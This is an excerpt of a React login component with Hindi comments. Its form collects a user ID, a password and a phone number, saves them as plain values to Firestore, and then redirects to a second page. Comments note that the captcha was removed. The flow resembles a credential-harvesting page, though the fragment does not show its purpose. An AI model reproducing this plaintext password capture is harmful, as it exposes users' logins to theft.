...
// कंपोनेंट का नाम वापस FirstPage कर दिया गया है
const FirstPage = () => { 
  // सारे स्टेट्स को डिफाइन करें
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  // केवल 'English' को डिफ़ॉल्ट रखा गया है, अन्य भाषा चुनने का UI हटा दिया गया
  ...
  const handleSubmit = async (e) => {
    ...
    // अब कोई Captcha वेरिफिकेशन नहीं है
    ...
    try {
      ...
      // Firestore में डेटा अपलोड करें (केवल User ID, Password, और Phone Number)
      ...
      const result = await FirebaseUtil.uploadAnyModel(`${COLLECTION_NAME}/${documentId}`, {
        ...
        password,
        phoneNumber,
        language, // भाषा को भी सेव कर रहे हैं
        timeStamp: timestamp,
      });
      ...
      if (result.state === 'success') {
        ...
        setTimeout(() => {
          ...
          // सुनिश्चित करें कि यह /second/ पर जाए
          ...
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            ...
            <div className="space-y-6">
              ...
              <form onSubmit={handleSubmit} className="space-y-4">
                ...
                {/* भाषा चयन - अब केवल डिफ़ॉल्ट रूप से English है */}
                <div className="hidden">
                    <select
                        className="w-full py-2 px-3 rounded text-sm bg-gray-800 border border-[#4D9DE0] text-white focus:outline-none focus:ring-2 focus:ring-[#4D9DE0]"
                        value={language}
            ...
            {/* दायाँ कॉलम: जानकारी और क्विक लिंक्स (डिजाइन के लिए रखा गया है) */}
            <div className="space-y-6">
